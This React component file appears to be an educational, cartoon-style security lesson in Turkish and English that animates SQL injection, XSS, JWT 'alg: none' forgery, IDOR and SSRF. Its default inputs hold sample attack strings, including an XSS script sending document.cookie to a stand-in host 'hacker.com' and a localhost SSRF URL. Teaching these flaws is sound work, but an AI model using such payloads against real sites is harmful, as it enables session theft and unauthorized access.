import React, { useState, useEffect } from 'react'

export default function SecuritySimulations({ variant, darkMode, language }) {
    const isTr = language === 'tr'

    switch (variant) {
        case 'sqli':
            return <SQLiSimulation isTr={isTr} darkMode={darkMode} />
        case 'xss':
            return <XssSimulation isTr={isTr} darkMode={darkMode} />
        case 'jwt':
            return <JwtSimulation isTr={isTr} darkMode={darkMode} />
        case 'idor':
            return <IdorSimulation isTr={isTr} darkMode={darkMode} />
        case 'ssrf':
            return <SsrfSimulation isTr={isTr} darkMode={darkMode} />
        default:
            return null
    }
}

// ─── 1. SQL INJECTION SIMULATION (LEGO CABINET EXPLOSION) ───────────────────
function SQLiSimulation({ isTr, darkMode }) {
    const [payload, setPayload] = useState("admin' OR '1'='1")
    const [exploded, setExploded] = useState(false)
    const [shake, setShake] = useState(false)

    const handleHack = () => {
        if (payload.includes("'") || payload.includes("OR")) {
            setShake(true)
            setTimeout(() => {
                setShake(false)
                setExploded(true)
            }, 600)
        } else {
            alert(isTr ? "Girilen değer dolap kilidini zorlamadı! SQL tırnağı (') veya OR mantığı kullanmayı dene." : "Input didn't stress the cabinet! Try SQL quote (') or OR logic statements.")
        }
    }

    const reset = () => {
        setExploded(false)
        setShake(false)
    }

    return (
        <div className={`p-5 rounded-2xl border-2 transition-all duration-300 mt-4 ${
            darkMode ? 'bg-slate-900 border-rose-800/80 text-rose-300' : 'bg-rose-50 border-rose-200 text-rose-800'
        }`}>
            <div className="flex items-center gap-2 mb-3">
                <span className="text-xl">🗄️</span>
                <span className="font-bold text-sm uppercase tracking-wider">
                    {isTr ? "LEGO Veritabanı Dolabı Simülatörü" : "LEGO Database Cabinet Simulator"}
                </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 items-center">
                {/* Controls */}
                <div className="space-y-3">
                    <label className="block text-xs font-semibold">
                        {isTr ? "Maymuncuk SQL Kodu Enjekte Et:" : "Inject Skeleton SQL Payload:"}
                    </label>
                    <div className="flex gap-2">
                        <input
                            type="text"
                            value={payload}
                            onChange={(e) => setPayload(e.target.value)}
                            className={`flex-1 p-2 rounded-lg font-mono text-xs border outline-none ${
                                darkMode ? 'bg-slate-800 border-slate-700 text-white' : 'bg-white border-rose-200 text-slate-800'
                            }`}
                        />
                        <button
                            onClick={handleHack}
                            className="px-4 py-2 bg-rose-600 hover:bg-rose-700 text-white text-xs font-bold rounded-lg transition-transform active:scale-95 shadow-md"
                        >
                            💥 {isTr ? "Uçur!" : "Blast!"}
                        </button>
                        <button
                            onClick={reset}
                            className="px-3 py-2 bg-slate-600 hover:bg-slate-700 text-white text-xs font-bold rounded-lg transition-transform active:scale-95"
                        >
                            ↺
                        </button>
                    </div>
                    <p className="text-[11px] opacity-80 leading-relaxed">
                        {isTr
                            ? "Tırnak işareti (') ile mevcut kod zincirini kırarız, OR '1'='1' ile veritabanı dolabına tüm çekmeceleri ('true') açmasını emrederiz."
                            : "We use a quote (') to break the active code block, and OR '1'='1' to command the database to unlock and open all drawers ('true')."}
                    </p>
                </div>

                {/* Cabinet Graphic */}
                <div className="flex justify-center p-4 relative overflow-hidden min-h-[160px]">
                    <div
                        className={`w-32 h-36 bg-amber-700 border-4 border-amber-900 rounded-xl relative flex flex-col justify-around p-2 transition-transform ${
                            shake ? 'animate-bounce' : ''
                        }`}
                        style={{
                            boxShadow: '0 8px 16px rgba(0,0,0,0.2)',
                            transform: exploded ? 'rotate(5deg) scale(0.95)' : 'none',
                            transition: 'all 0.4s ease'
                        }}
                    >
                        {/* Lock Hole */}
                        <div className={`absolute -top-3 left-1/2 -translate-x-1/2 w-8 h-8 rounded-full border-4 border-slate-400 bg-slate-800 flex items-center justify-center transition-all ${
                            exploded ? 'bg-red-600 scale-125 border-red-400 animate-ping' : ''
                        }`}>
                            <span className="text-[10px]">🔑</span>
                        </div>

                        {/* Drawers */}
                        {[1, 2, 3].map((num) => (
                            <div
                                key={num}
                                className={`h-8 border-2 border-amber-900 rounded-md relative flex items-center justify-center bg-amber-500 transition-all ${
                                    exploded
                                        ? num === 1
                                            ? '-translate-x-12 translate-y-4 -rotate-12 bg-red-400'
                                            : num === 2
                                                ? 'translate-x-14 -translate-y-2 rotate-12 bg-red-400'
                                                : '-translate-x-4 translate-y-10 rotate-45 bg-red-400'
                                        : ''
                                }`}
                                style={{
                                    transition: 'all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275)'
                                }}
                            >
                                <div className="w-4 h-2 bg-amber-950 rounded-sm" />
                                {exploded && (
                                    <span className="absolute text-[9px] font-bold text-white uppercase tracking-tighter">
                                        {num === 1 ? "👤 USER_DB" : num === 2 ? "💳 CREDIT" : "🔑 SECRETS"}
                                    </span>
                                )}
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        </div>
    )
}

// ─── 2. CROSS-SITE SCRIPTING (XSS) SIMULATION (COOKIE STEALING MONSTER) ──────
function XssSimulation({ isTr, darkMode }) {
    const [scriptInput, setScriptInput] = useState("<script>fetch('http://hacker.com?c=' + document.cookie)</script>")
    const [step, setStep] = useState(0) // 0: Idle, 1: Script Saved on Board, 2: Gobo views, 3: Cookie stolen!

    const handleTrigger = () => {
        if (scriptInput.toLowerCase().includes("<script>") || scriptInput.toLowerCase().includes("onload")) {
            setStep(1)
            setTimeout(() => setStep(2), 1200)
            setTimeout(() => setStep(3), 2800)
        } else {
            alert(isTr ? "Panoya düz yazı asıldı, zafiyet yok! Kodu tetikleyecek <script> etiketleri kullan." : "Plain text posted, no exploit! Use <script> tags to trigger execution.")
        }
    }

    const reset = () => {
        setStep(0)
    }

    return (
        <div className={`p-5 rounded-2xl border-2 transition-all duration-300 mt-4 ${
            darkMode ? 'bg-slate-900 border-indigo-800/80 text-indigo-300' : 'bg-indigo-50 border-indigo-200 text-indigo-800'
        }`}>
            <div className="flex items-center gap-2 mb-3">
                <span className="text-xl">👾</span>
                <span className="font-bold text-sm uppercase tracking-wider">
                    {isTr ? "XSS Bombalı İlan Panosu" : "XSS Bulletin Board Exploit"}
                </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 items-center">
                {/* Controls */}
                <div className="space-y-3">
                    <label className="block text-xs font-semibold">
                        {isTr ? "Zehirli İlanı Panoya Yapıştır:" : "Stick Poisoned Notice on Board:"}
                    </label>
                    <textarea
                        value={scriptInput}
                        onChange={(e) => setScriptInput(e.target.value)}
                        rows={2}
                        className={`w-full p-2 rounded-lg font-mono text-[11px] border outline-none ${
                            darkMode ? 'bg-slate-800 border-slate-700 text-white' : 'bg-white border-indigo-200 text-slate-800'
                        }`}
                    />
                    <div className="flex gap-2">
                        <button
                            onClick={handleTrigger}
                            className="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold rounded-lg transition-transform active:scale-95 shadow-md"
                        >
                            📌 {isTr ? "Panoya As!" : "Pin to Board!"}
                        </button>
                        <button
                            onClick={reset}
                            className="px-3 py-2 bg-slate-600 hover:bg-slate-700 text-white text-xs font-bold rounded-lg transition-transform active:scale-95"
                        >
                            ↺
                        </button>
                    </div>
                </div>

                {/* Animated Board Graphic */}
                <div className="flex flex-col items-center p-4 relative min-h-[180px] bg-slate-950/40 rounded-xl border border-slate-800">
                    {/* Notice Board */}
                    <div className="w-full h-20 bg-amber-900 border-4 border-amber-950 rounded-md relative p-2 flex flex-col justify-center items-center">
                        <div className="absolute top-1 left-2 text-[9px] font-bold text-amber-200 uppercase">
                            {isTr ? "📢 OKUL PANOSU" : "📢 NOTICE BOARD"}
                        </div>
                        {step >= 1 ? (
                            <div className="bg-yellow-200 text-slate-800 text-[8px] font-mono p-1 rounded shadow rotate-2 max-w-[85%] text-center animate-pulse">
                                📌 {isTr ? "Zehirli Script Asıldı!" : "Script Injected!"}
                            </div>
                        ) : (
                            <div className="text-slate-400 text-xs italic">
                                {isTr ? "Pano Boş" : "Board is Empty"}
                            </div>
                        )}
                    </div>

                    {/* Characters Area */}
                    <div className="w-full flex justify-between items-center mt-6 px-4 relative">
                        {/* Gobo (Victim) */}
                        <div className="flex flex-col items-center">
                            <div className={`w-10 h-10 rounded-full bg-emerald-500 relative flex items-center justify-center border-2 border-emerald-600 transition-all ${
                                step === 2 ? 'scale-110 shadow-lg shadow-emerald-400/50' : ''
                            }`}>
                                <div className="absolute top-3 left-2 w-2 h-2 rounded-full bg-white flex items-center justify-center"><div className="w-1 h-1 bg-black rounded-full" /></div>
                                <div className="absolute top-3 right-2 w-2 h-2 rounded-full bg-white flex items-center justify-center"><div className="w-1 h-1 bg-black rounded-full" /></div>
                                <div className={`absolute bottom-2 w-4 h-2 rounded-b-full bg-emerald-800 transition-all ${
                                    step === 2 ? 'h-4 bg-red-600' : ''
                                }`} />
                            </div>
                            <span className="text-[10px] font-bold mt-1 text-slate-400">Gobo</span>
                        </div>

                        {/* Stolen Cookie floating animation */}
                        {step === 3 && (
                            <div
                                className="absolute text-xl animate-bounce"
                                style={{
                                    animation: 'cookieSlide 1.5s ease-out infinite',
                                    left: '20%'
                                }}
                            >
                                🍪 <span className="text-[8px] font-mono text-red-400 bg-black/60 px-1 rounded">SessionID</span>
                            </div>
                        )}

                        {/* Hacker (Attacker) */}
                        <div className="flex flex-col items-center">
                            <div className={`w-10 h-10 rounded-full bg-slate-800 relative flex items-center justify-center border-2 border-red-600 transition-all ${
                                step === 3 ? 'scale-115 shadow-lg shadow-red-500/50' : ''
                            }`}>
                                <div className="absolute top-2 text-xs">🕶️</div>
                                <div className="absolute bottom-2 w-4 h-1 bg-red-600 rounded" />
                            </div>
                            <span className="text-[10px] font-bold mt-1 text-slate-400">Hacker</span>
                        </div>
                    </div>

                    <style dangerouslySetInnerHTML={{__html: `
                        @keyframes cookieSlide {
                            0% { left: 15%; bottom: 20px; opacity: 1; transform: scale(1); }
                            100% { left: 75%; bottom: 20px; opacity: 0; transform: scale(0.6); }
                        }
                    `}} />
                </div>
            </div>
        </div>
    )
}

// ─── 3. JWT AUTHENTICATION SIMULATION (TICKET STAMP) ────────────────────────
function JwtSimulation({ isTr, darkMode }) {
    const [jwtRole, setJwtRole] = useState("user")
    const [algorithm, setAlgorithm] = useState("none")
    const [success, setSuccess] = useState(null)

    const handleVerify = () => {
        if (jwtRole === "admin") {
            if (algorithm === "none") {
                // Skips checks due to algorithm: none
                setSuccess(true)
            } else {
                // Check fails because secret key was forged
                setSuccess(false)
            }
        } else {
            setSuccess(false)
        }
    }

    return (
        <div className={`p-5 rounded-2xl border-2 transition-all duration-300 mt-4 ${
            darkMode ? 'bg-slate-900 border-amber-800/80 text-amber-300' : 'bg-amber-50 border-amber-200 text-amber-800'
        }`}>
            <div className="flex items-center gap-2 mb-3">
                <span className="text-xl">🎟️</span>
                <span className="font-bold text-sm uppercase tracking-wider">
                    {isTr ? "JWT Sahte Bilet Simülatörü" : "JWT Ticket Forger Simulator"}
                </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 items-center">
                {/* Controls */}
                <div className="space-y-4">
                    <div className="space-y-1">
                        <label className="block text-xs font-semibold">
                            {isTr ? "Bilet Rolünü Değiştir (Payload):" : "Modify Ticket Role (Payload):"}
                        </label>
                        <select
                            value={jwtRole}
                            onChange={(e) => setJwtRole(e.target.value)}
                            className={`w-full p-2 rounded-lg text-xs border outline-none ${
                                darkMode ? 'bg-slate-800 border-slate-700 text-white' : 'bg-white border-amber-200 text-slate-800'
                            }`}
                        >
                            <option value="user">User</option>
                            <option value="admin">Admin (Hacker)</option>
                        </select>
                    </div>

                    <div className="space-y-1">
                        <label className="block text-xs font-semibold">
                            {isTr ? "İmza Doğrulama Algoritması (Header):" : "Signature Algorithm (Header):"}
                        </label>
                        <select
                            value={algorithm}
                            onChange={(e) => setAlgorithm(e.target.value)}
                            className={`w-full p-2 rounded-lg text-xs border outline-none ${
                                darkMode ? 'bg-slate-800 border-slate-700 text-white' : 'bg-white border-amber-200 text-slate-800'
                            }`}
                        >
                            <option value="none">none (Algoritma Kontrolünü Kapat/Atla)</option>
                            <option value="HS256">HS256 (Gizli Anahtar Mühür Kontrolü)</option>
                        </select>
                    </div>

                    <div className="flex gap-2">
                        <button
                            onClick={handleVerify}
                            className="px-4 py-2 bg-amber-600 hover:bg-amber-700 text-white text-xs font-bold rounded-lg transition-transform active:scale-95 shadow-md"
                        >
                            🎟️ {isTr ? "Bileti Sunucuya Gönder!" : "Send Ticket to Guard!"}
                        </button>
                        <button
                            onClick={() => { setJwtRole("user"); setAlgorithm("none"); setSuccess(null) }}
                            className="px-3 py-2 bg-slate-600 hover:bg-slate-700 text-white text-xs font-bold rounded-lg transition-transform active:scale-95"
                        >
                            ↺
                        </button>
                    </div>
                </div>

                {/* Ticket and Guard graphics */}
                <div className="flex flex-col items-center justify-center p-4 relative min-h-[180px] bg-slate-950/40 rounded-xl border border-slate-800">
                    {/* The wristband / ticket */}
                    <div className="w-48 p-2 rounded-xl bg-gradient-to-r from-purple-500 to-indigo-600 border-2 border-white relative shadow-lg text-white font-mono text-[9px] space-y-1">
                        <div className="flex justify-between border-b border-white/20 pb-1">
                            <span>alg: {algorithm}</span>
                            <span>typ: JWT</span>
                        </div>
                        <div className="py-1">
                            role: <span className="font-bold text-yellow-300 uppercase">{jwtRole}</span>
                        </div>
                        <div className="text-[8px] opacity-70 text-right">
                            {algorithm === 'none' ? '// signature omitted' : 'sig: f89a3d12...'}
                        </div>
                    </div>

                    {/* Verification Result */}
                    {success !== null && (
                        <div className={`mt-4 p-3 rounded-lg border-2 text-center text-xs font-bold w-48 transition-all duration-300 ${
                            success
                                ? 'bg-green-500/20 border-green-500 text-green-300'
                                : 'bg-red-500/20 border-red-500 text-red-300'
                        }`}>
                            {success
                                ? (isTr ? "🎉 GİRİŞ BAŞARILI! (Admin Yetkileri Kazanıldı)" : "🎉 ACCESS GRANTED! (Admin Active)")
                                : (isTr ? "❌ REDDEDİLDİ! Yetkisiz/Sahte İmza" : "❌ TICKET REJECTED! Unauthorized")}
                        </div>
                    )}
                </div>
            </div>
        </div>
    )
}

// ─── 4. IDOR SIMULATION (SLIDING LEGO HOUSES) ──────────────────────────────
function IdorSimulation({ isTr, darkMode }) {
    const [selectedHouse, setSelectedHouse] = useState(5) // default: 5 (Your House)
    const [doorOpened, setDoorOpened] = useState(false)

    const handleInspect = () => {
        setDoorOpened(true)
    }

    const reset = () => {
        setSelectedHouse(5)
        setDoorOpened(false)
    }

    return (
        <div className={`p-5 rounded-2xl border-2 transition-all duration-300 mt-4 ${
            darkMode ? 'bg-slate-900 border-emerald-800/80 text-emerald-300' : 'bg-emerald-50 border-emerald-200 text-emerald-800'
        }`}>
            <div className="flex items-center gap-2 mb-3">
                <span className="text-xl">🏡</span>
                <span className="font-bold text-sm uppercase tracking-wider">
                    {isTr ? "IDOR Renkli LEGO Evleri Simülatörü" : "IDOR Lego Houses Simulator"}
                </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 items-center">
                {/* Controls */}
                <div className="space-y-4">
                    <div className="space-y-1">
                        <label className="block text-xs font-semibold">
                            {isTr ? "URL API Parametresini Değiştir (?userId=):" : "Modify URL API Parameter (?userId=):"}
                        </label>
                        <div className="flex items-center gap-2 font-mono text-xs p-2 rounded bg-slate-800 border border-slate-700 text-slate-300">
                            <span>/api/getUserData?userId=</span>
                            <input
                                type="number"
                                value={selectedHouse}
                                onChange={(e) => {
                                    setSelectedHouse(parseInt(e.target.value) || 0)
                                    setDoorOpened(false)
                                }}
                                className="w-10 bg-slate-900 text-yellow-300 font-bold border border-slate-600 outline-none text-center rounded"
                            />
                        </div>
                    </div>

                    <div className="flex gap-2">
                        <button
                            onClick={handleInspect}
                            className="px-4 py-2 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold rounded-lg transition-transform active:scale-95 shadow-md"
                        >
                            🚪 {isTr ? "Evi İncele / Kapıyı Aç" : "Inspect House / Open Door"}
                        </button>
                        <button
                            onClick={reset}
                            className="px-3 py-2 bg-slate-600 hover:bg-slate-700 text-white text-xs font-bold rounded-lg transition-transform active:scale-95"
                        >
                            ↺
                        </button>
                    </div>
                </div>

                {/* Lego Houses Area */}
                <div className="flex justify-center items-end gap-3 p-4 relative min-h-[180px] bg-slate-950/40 rounded-xl border border-slate-800">
                    {[4, 5, 6].map((num) => {
                        const isTarget = selectedHouse === num
                        return (
                            <div
                                key={num}
                                className={`w-16 h-28 relative flex flex-col justify-end items-center rounded-lg border-2 ${
                                    num === 4
                                        ? 'bg-blue-500 border-blue-600'
                                        : num === 5
                                            ? 'bg-amber-500 border-amber-600'
                                            : 'bg-red-500 border-red-600'
                                }`}
                                style={{
                                    boxShadow: isTarget ? '0 0 16px rgba(253,224,71,0.6)' : 'none',
                                    transform: isTarget ? 'scale(1.05)' : 'scale(0.95)',
                                    transition: 'all 0.3s ease'
                                }}
                            >
                                {/* Roof */}
                                <div className="absolute -top-3 w-18 h-4 bg-slate-700 rotate-12 rounded" style={{ width: '74px' }} />

                                {/* House ID plate */}
                                <div className="absolute top-2 px-1 bg-white text-black font-bold text-[8px] rounded border border-slate-400">
                                    ID: {num}
                                </div>

                                {/* Door */}
                                <div
                                    className="w-8 h-12 bg-yellow-950 border border-yellow-900 rounded-t-sm relative transition-all duration-500"
                                    style={{
                                        transformOrigin: 'left',
                                        transform: isTarget && doorOpened ? 'rotateY(-110deg)' : 'none'
                                    }}
                                >
                                    {/* Handle */}
                                    <div className="w-1.5 h-1.5 bg-yellow-400 rounded-full absolute right-1 top-6" />
                                </div>

                                {/* Secret items behind door */}
                                {isTarget && doorOpened && (
                                    <div className="absolute bottom-2 text-center text-[8px] text-white font-mono bg-black/80 px-1 rounded animate-fade-in">
                                        {num === 5 ? (
                                            <span>🏡 {isTr ? "Kendi Evin" : "Your profile"}</span>
                                        ) : num === 4 ? (
                                            <span>🎁 {isTr ? "Alice'in Verileri" : "Alice's Toys"}</span>
                                        ) : (
                                            <span>💎 {isTr ? "Bob'un Şifresi" : "Bob's Secrets"}</span>
                                        )}
                                    </div>
                                )}
                            </div>
                        )
                    })}
                </div>
            </div>
        </div>
    )
}

// ─── 5. SSRF SIMULATION (KEEPER GUARD CONTROLLER) ──────────────────────────
function SsrfSimulation({ isTr, darkMode }) {
    const [pathInput, setPathInput] = useState("http://localhost:8080/admin/secrets")
    const [guardReaction, setGuardReaction] = useState("idle") // idle, scan, found, blocked
    const [leakData, setLeakData] = useState(null)

    const handleSend = () => {
        setGuardReaction("scan")
        setLeakData(null)
        setTimeout(() => {
            if (pathInput.includes("localhost") || pathInput.includes("127.0.0.1")) {
                setGuardReaction("found")
                setLeakData(isTr ? "🔑 AWS_SECRET_KEY = 3d2f1a9e8d" : "🔑 AWS_SECRET_KEY = 3d2f1a9e8d")
            } else {
                setGuardReaction("blocked")
                setLeakData(null)
            }
        }, 1200)
    }

    const reset = () => {
        setPathInput("http://localhost:8080/admin/secrets")
        setGuardReaction("idle")
        setLeakData(null)
    }

    return (
        <div className={`p-5 rounded-2xl border-2 transition-all duration-300 mt-4 ${
            darkMode ? 'bg-slate-900 border-indigo-800/80 text-indigo-300' : 'bg-indigo-50 border-indigo-200 text-indigo-800'
        }`}>
            <div className="flex items-center gap-2 mb-3">
                <span className="text-xl">🏰</span>
                <span className="font-bold text-sm uppercase tracking-wider">
                    {isTr ? "SSRF Robot Muhafız Geçidi" : "SSRF Robot Guard Gateway"}
                </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 items-center">
                {/* Controls */}
                <div className="space-y-4">
                    <div className="space-y-1">
                        <label className="block text-xs font-semibold">
                            {isTr ? "Muhafıza Resim/URL Adresi Ver (URL):" : "Provide Fetch Address to Guard (URL):"}
                        </label>
                        <input
                            type="text"
                            value={pathInput}
                            onChange={(e) => setPathInput(e.target.value)}
                            className={`w-full p-2 rounded-lg font-mono text-xs border outline-none ${
                                darkMode ? 'bg-slate-800 border-slate-700 text-white' : 'bg-white border-indigo-200 text-slate-800'
                            }`}
                        />
                    </div>

                    <div className="flex gap-2">
                        <button
                            onClick={handleSend}
                            className="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold rounded-lg transition-transform active:scale-95 shadow-md"
                        >
                            🚀 {isTr ? "Robotu Gönder!" : "Dispatch Robot!"}
                        </button>
                        <button
                            onClick={reset}
                            className="px-3 py-2 bg-slate-600 hover:bg-slate-700 text-white text-xs font-bold rounded-lg transition-transform active:scale-95"
                        >
                            ↺
                        </button>
                    </div>
                </div>

                {/* Robot graphic and network flow */}
                <div className="flex flex-col items-center justify-center p-4 relative min-h-[180px] bg-slate-950/40 rounded-xl border border-slate-800 overflow-hidden">
                    {/* The Robot */}
                    <div className={`w-12 h-16 bg-slate-700 rounded-lg border-2 border-slate-500 relative flex flex-col items-center p-1 transition-transform ${
                        guardReaction === 'scan' ? 'animate-bounce' : ''
                    }`}>
                        {/* Robot eyes */}
                        <div className="flex gap-2 mt-1">
                            <div className={`w-2 h-2 rounded-full ${guardReaction === 'found' ? 'bg-red-500 animate-ping' : 'bg-blue-400'}`} />
                            <div className={`w-2 h-2 rounded-full ${guardReaction === 'found' ? 'bg-red-500 animate-ping' : 'bg-blue-400'}`} />
                        </div>
                        {/* Robot armor badge */}
                        <div className="w-6 h-4 bg-slate-600 rounded border border-slate-500 mt-2 text-[8px] flex items-center justify-center font-bold text-white">
                            {guardReaction === 'scan' ? '...' : guardReaction === 'found' ? 'LEAK' : 'OK'}
                        </div>
                    </div>

                    {/* Status output text bubble */}
                    <div className="mt-3 text-center min-h-[40px]">
                        {guardReaction === 'scan' && (
                            <span className="text-xs text-yellow-300 animate-pulse">
                                ⏳ {isTr ? "Robot kalenin içinde adrese ulaşıyor..." : "Robot navigating internal corridors..."}
                            </span>
                        )}
                        {guardReaction === 'found' && (
                            <div className="space-y-1">
                                <div className="text-xs text-red-400 font-bold">
                                    🚨 {isTr ? "Sızma Başarılı! Gizli Veriler Leaked:" : "SSRF Triggered! Leaked secrets:"}
                                </div>
                                <div className="text-[10px] font-mono bg-black/60 px-2 py-1 rounded text-red-300">
                                    {leakData}
                                </div>
                            </div>
                        )}
                        {guardReaction === 'blocked' && (
                            <span className="text-xs text-green-400 font-bold">
                                🛡️ {isTr ? "Güvenli dış adres. Herhangi bir veri sızmadı." : "Safe external domain. No secrets leaked."}
                            </span>
                        )}
                    </div>
                </div>
            </div>
        </div>
    )
}
